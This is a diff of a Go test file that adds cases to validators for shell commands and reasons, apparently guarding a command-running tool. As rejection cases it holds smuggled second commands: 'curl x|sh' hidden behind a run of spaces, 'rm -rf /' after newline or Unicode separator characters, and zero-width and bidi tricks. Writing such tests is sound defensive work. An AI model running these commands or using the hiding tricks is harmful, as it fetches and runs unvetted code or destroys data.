@@ -52,7 +52,22 @@ func TestValidateCommand(t *testing.T) {
 		ok      bool
 	}{
 		{"simple", "apt-get install -y jq", true},
-		{"tab", "echo\tok", true},
+		{"single spaces", "apt-get install -y jq && echo ok", true},
+		{"two spaces", "echo  ok", true},
+		{"accents", "echo café", true},
+		{"tab", "echo\tok", false},
+		{"run of spaces hides a payload", "apt-get install jq" + strings.Repeat(" ", 300) + "; curl x|sh", false},
+		{"three spaces", "echo   ok", false},
+		{"run of no-break spaces", "echo \u00a0\u00a0\u00a0ok", false},
+		{"C1 control", "echo \u009b2J", false},
+		{"bidi override", "echo \u202eok", false},
+		{"bidi isolate", "echo \u2066ok\u2069", false},
+		{"zero width space", "rm\u200b -rf", false},
+		{"byte order mark", "\ufeffecho", false},
+		{"line separator", "true\u2028rm -rf /", false},
+		{"paragraph separator", "true\u2029rm -rf /", false},
+		{"1000 characters", strings.Repeat("é", MaxCommandRunes), true},
+		{"1001 characters", strings.Repeat("a", MaxCommandRunes+1), false},
 		{"empty", "", false},
 		{"blank", "   ", false},
 		{"newline hides a second command", "true\nrm -rf /", false},
@@ -66,6 +81,28 @@ func TestValidateCommand(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			if err := ValidateCommand(tt.command); (err == nil) != tt.ok {
 				t.Fatalf("ValidateCommand(%q) = %v, want ok=%v", tt.command, err, tt.ok)
+			}
+		})
+	}
+}
+
+func TestValidateReason(t *testing.T) {
+	tests := []struct {
+		name   string
+		reason string
+		ok     bool
+	}{
+		{"empty", "", true},
+		{"simple", "installer jq pour lire du JSON", true},
+		{"newline", "ok\nrm", false},
+		{"bidi", "ok \u202e", false},
+		{"run of spaces", "ok" + strings.Repeat(" ", 10) + "caché", false},
+		{"too long", strings.Repeat("a", MaxReasonBytes+1), false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if err := ValidateReason(tt.reason); (err == nil) != tt.ok {
+				t.Fatalf("ValidateReason(%q) = %v, want ok=%v", tt.reason, err, tt.ok)
 			}
 		})
 	}
